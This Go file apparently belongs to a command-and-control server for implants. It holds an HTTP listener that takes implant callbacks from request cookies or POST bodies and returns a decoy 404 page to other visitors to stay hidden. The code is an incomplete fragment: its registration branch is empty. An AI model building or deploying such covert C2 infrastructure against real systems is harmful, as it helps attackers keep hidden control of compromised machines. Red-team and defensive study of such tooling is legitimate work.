package listener

import (
	"io"
	"net/http"
	"purpcmd/server/implant"
	"strings"
)

func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
	a := processPayload(r)
	
	if a == implant.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	} else if a == implant.REG {
		
	}

	w.WriteHeader(200)
	w.Write([]byte("Hi!"))
}


func processPayload(r *http.Request) int {
	var stringReadCloser io.ReadCloser
	
	if r.Method == "GET" {
		cookies := r.Cookies()
		if len(cookies) == 0 {
			return implant.NIL
		} else {
			stringReader := strings.NewReader(cookies[0].Value)
			stringReadCloser = io.NopCloser(stringReader)
		}
	} else if r.Method == "POST" {
		stringReadCloser = r.Body
	}

	return implant.ParseCallback(stringReadCloser)
}